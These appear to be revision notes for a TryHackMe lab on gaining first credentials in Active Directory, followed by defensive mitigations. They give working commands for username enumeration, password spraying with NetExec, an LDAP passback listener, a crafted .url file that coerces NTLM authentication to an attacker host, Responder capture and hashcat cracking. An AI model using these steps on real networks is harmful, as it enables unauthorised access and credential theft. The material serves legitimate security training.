# 🔓 Introduction to Active Directory Breaching

> **TryHackMe Topic:** Introduction to AD Breaching
>
> **Purpose:** Structured revision notes covering the initial phase of an Active Directory attack chain: obtaining the first set of valid AD credentials.

---

# 📖 Overview

Active Directory (AD) breaching is the process of obtaining an initial set of valid AD credentials when starting from scratch.

This is the first phase of an AD attack chain.

```text
Initial Access
      ↓
Valid AD Credentials
      ↓
Domain Enumeration
      ↓
Lateral Movement
      ↓
Privilege Escalation
```

Even a low-privileged domain account can provide useful information about users, groups, computers, Group Policies, and trust relationships.

---

# 🎯 Learning Objectives

This topic covers:

- AD attack surface
- Unauthenticated and authenticated starting positions
- OSINT-based username discovery
- Username enumeration with Kerbrute
- DNS enumeration with nslookup
- Credential discovery in Git repositories
- Credential discovery in Jenkins
- Password spraying
- Account lockout considerations
- Password spraying with NetExec
- LDAP passback attacks
- File-based authentication coercion
- NTLMv2 capture
- Hash cracking with Hashcat
- Defensive mitigations

---

# 🌐 AD Attack Surface

| Service / Protocol | Port | Potential Relevance |
|---|---:|---|
| SMB | TCP 445 | File shares, printers, remote administration, password spraying |
| LDAP | TCP 389 / 636 | Directory access and possible credential exposure |
| HTTP / HTTPS | 80 / 443 | Internal portals, CI/CD, management interfaces |
| Kerberos | TCP/UDP 88 | Authentication and username enumeration |
| DNS | TCP/UDP 53 | Domain infrastructure and service discovery |

---

# 🚩 Starting Positions

## Unauthenticated — Black Box

You have network access but no valid domain credentials.

Possible approaches include:

- Enumeration
- Username discovery
- Password spraying
- Coercion

## Authenticated — Grey Box

You already have valid low-privileged credentials.

The workflow can move directly toward:

```text
Enumeration
    ↓
Credential Discovery
    ↓
Privilege Escalation
    ↓
Lateral Movement
```

---

# 🔎 OSINT and Username Reconnaissance

Potential sources include:

- LinkedIn
- GitHub / GitLab
- Public data breaches
- Corporate websites
- Job listings

The goal is to build a list of potential usernames.

## Common Username Formats

For Jane Smith:

| Format | Example |
|---|---|
| `first.last` | `jane.smith` |
| `firstlast` | `janesmith` |
| `flast` | `jsmith` |
| `first.l` | `jane.s` |
| `first` | `jane` |
| `last.first` | `smith.jane` |

---

# 🔐 Username Enumeration with Kerbrute

Kerbrute can validate potential usernames against an AD domain through Kerberos behaviour.

A non-existent username can produce:

```text
KDC_ERR_C_PRINCIPAL_UNKNOWN
```

A valid username causes the KDC to request pre-authentication.

The supplied material notes that this does not count as a normal failed login for account-lockout purposes, but it does generate Windows Event ID **4768**.

## Lab Example

```bash
kerbrute userenum -d thm.loc --dc 192.168.12.100 /root/usernames.txt
```

## Save Results

```bash
kerbrute userenum -d thm.loc --dc 192.168.12.100 /root/usernames.txt -o valid_users.txt
```

---

# 🌐 DNS Enumeration

## Domain Controllers

```bash
nslookup -type=SRV _ldap._tcp.dc._msdcs.thm.loc 192.168.12.100
```

## Kerberos KDC

```bash
nslookup -type=SRV _kerberos._tcp.thm.loc 192.168.12.100
```

## Mail Servers

```bash
nslookup -type=MX thm.loc 192.168.12.100
```

---

# 🔑 Credential Discovery

Exposed internal services may contain:

- Passwords
- Service-account credentials
- API keys
- Deployment secrets
- Connection strings

The supplied material maps unsecured credentials to:

```text
MITRE ATT&CK T1552
Unsecured Credentials
```

## Git

Common locations:

```text
Commit history
Configuration files
Hardcoded secrets
CI/CD definitions
```

Example:

```bash
git log -p | grep -i "password\|secret\|token\|key\|credential"
```

## TruffleHog

```bash
trufflehog git file:///path/to/repo
```

## Jenkins

Potential locations:

- Build console output
- Job configuration
- Environment variables
- Workspace files

Example:

```bash
curl http://ci.thm.loc/job/JOB_NAME/lastBuild/consoleText | grep -i "password\|secret\|token\|credential"
```

---

# 💥 Password Spraying

Password spraying tries one password against many accounts.

```text
One Password
     ↓
Many Accounts
```

Brute force instead uses:

```text
One Account
     ↓
Many Passwords
```

Before spraying, understand the domain's lockout policy.

## Query Policy with NetExec

```bash
nxc smb 192.168.12.100 -u 'validuser' -p 'validpassword' --pass-pol
```

The lab example reports:

```text
Minimum password length: 8
Password history length: 12
Account Lockout Threshold: 5
Reset Account Lockout Counter: 30
Locked Account Duration: 30
Password Complexity: ENABLED
```

If the policy is unknown, the supplied material recommends a conservative approach.

---

# 🧹 Clean Kerbrute Output

```bash
grep "VALID USERNAME" valid_users.txt | awk '{print $NF}' | sed 's/@thm.loc//' > clean_users.txt
```

# 🔥 Password Spraying with NetExec

```bash
nxc smb 192.168.12.100 -u clean_users.txt -p 'MegaCorp01!' --continue-on-success
```

### Result Indicators

```text
[+]
```

Successful authentication.

```text
STATUS_LOGON_FAILURE
```

Incorrect password.

```text
STATUS_ACCOUNT_DISABLED
```

Account exists but is disabled.

```text
STATUS_ACCOUNT_LOCKED_OUT
```

Account is locked.

```text
Pwn3d!
```

The account has local administrator privileges on the target.

## Jitter

```bash
nxc smb 192.168.12.100 -u clean_users.txt -p 'MegaCorp01!' --continue-on-success --jitter 2-5
```

If an account becomes locked, stop spraying and reassess the lockout policy.

---

# 🔄 Authentication Coercion

Authentication coercion attempts to force a device or user to send authentication material to an attacker-controlled listener.

This maps to:

```text
MITRE ATT&CK T1187
Forced Authentication
```

---

# 🖨️ LDAP Passback

Network devices such as printers and scanners may store LDAP credentials.

The attack redirects the device's LDAP connection to an attacker-controlled listener.

```text
Printer
   ↓
LDAP Configuration
   ↓
Attacker IP
   ↓
Connection Test
   ↓
Captured Credentials
```

## Lab

```text
http://printer.thm.loc/
```

Lab credentials:

```text
admin:admin
```

Configure the LDAP server to point to the attacker's `tun0` IP and a port such as:

```text
3489
```

## Listener

```bash
nc -lvnp 3489
```

The lab uses plaintext LDAP, so the listener can receive the LDAP service account's authentication material.

## Verify Credentials

```bash
nxc smb 192.168.12.100 -u 'svc.ldap' -p 'CAPTURED_PASSWORD'
```

---

# 📁 File-Based Coercion

A specially crafted `.url` file can cause Windows Explorer to load an icon from an external UNC path.

```text
Windows Explorer
       ↓
Loads Icon
       ↓
UNC Path
       ↓
SMB Authentication
       ↓
NTLMv2 Hash
       ↓
Attacker Listener
```

## Create the `.url` File

```bash
cat > @Shortcut.url << 'EOF'
[InternetShortcut]
URL=http://thm.loc
WorkingDirectory=thm
IconFile=\YOURTUN0IP\icons\icon.ico
IconIndex=1
EOF
```

The quoted `EOF` is deliberate in the lab example so the UNC path remains correctly formatted.

The leading `@` in `@Shortcut.url` causes the file to sort near the top of the directory listing.

---

# 🎧 Capture with Responder

```bash
sudo responder -I tun0
```

Responder can capture NTLMv2 authentication material sent to the attacker-controlled listener.

---

# 📤 Upload to SMB Share

```bash
smbclient //SERVER1.thm.loc/shared-docs -U 'THMlice.moore%MegaCorp01!'
```

Then:

```text
smb: \> put @Shortcut.url
smb: \> exit
```

When the simulated user browses the share, the NTLMv2 authentication material can appear in Responder.

---

# 🔓 Crack NTLMv2

Save the captured value to:

```text
hash.txt
```

Use Hashcat mode:

```text
5600
```

Example:

```bash
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt --force
```

The supplied material notes that Net-NTLMv2 cannot be used directly for Pass-the-Hash and must be cracked offline if password recovery is required.

---

# 🧩 Advanced Coercion

The supplied material mentions:

- PetitPotam
- PrinterBug / SpoolSample
- DFSCoerce

These are described as more advanced techniques that can be combined with relay attacks.

---

# 🛡️ Mitigation

## Secrets Management

- Use dedicated secrets vaults.
- Use pre-commit hooks with secret-scanning tools.
- Audit existing repositories and Git history.
- Rotate credentials immediately after exposure.
- Mask secrets in CI/CD logs.
- Restrict access to build output.

Examples mentioned in the material:

```text
HashiCorp Vault
Azure Key Vault
AWS Secrets Manager
```

## Password Policies

The supplied material recommends:

- Minimum password length of 14+ characters
- Banning common and organisation-specific patterns
- Avoiding organisation-wide default passwords
- Carefully configuring account lockout thresholds
- Monitoring distributed authentication failures

## Device Hardening

- Change default administrative credentials.
- Use LDAPS instead of plaintext LDAP.
- Restrict device administration interfaces.
- Use dedicated low-privilege service accounts.
- Include network devices in vulnerability scanning and asset management.

## File Share Security

- Enforce least privilege.
- Restrict unnecessary write access.
- Monitor suspicious files such as `.url`, `.lnk`, `.scf`, and `desktop.ini`.
- Monitor anomalous share activity.

## NTLM Hardening

- Disable NTLMv1.
- Enforce NTLMv2 as the minimum authentication level.
- Enforce SMB signing.
- Block unnecessary outbound SMB traffic.
- Work toward NTLM deprecation where possible.

## Network Segmentation

Restrict access to management interfaces such as:

- Printer administration
- Jenkins
- Git servers

Use dedicated management VLANs where appropriate.

## MFA

Enable MFA on:

- Internet-facing services
- VPN portals
- Email
- Remote-access gateways
- Critical internal services

---

# 🧠 Key Takeaways

- AD breaching focuses on obtaining the first valid set of domain credentials.
- Even low-privileged credentials can expose useful AD information.
- OSINT can help build username lists.
- Kerbrute can enumerate valid usernames through Kerberos behaviour.
- DNS enumeration helps identify important AD infrastructure.
- Git history can preserve credentials after removal from the latest version.
- Jenkins can expose credentials through logs, configuration, environment variables, and workspaces.
- Password spraying differs from brute forcing.
- Account lockout policies should be understood before spraying.
- NetExec can query password policies and perform authentication testing.
- LDAP passback can expose credentials stored by misconfigured devices.
- File-based coercion can trigger NTLM authentication through a malicious icon path.
- Responder can capture NTLMv2 authentication material.
- Hashcat mode `5600` is used in the supplied lab material for Net-NTLMv2 cracking.
- Secrets management, device hardening, file-share security, NTLM hardening, segmentation, and MFA reduce the attack surface.

---

# 📚 Reference

- TryHackMe — Introduction to AD Breaching
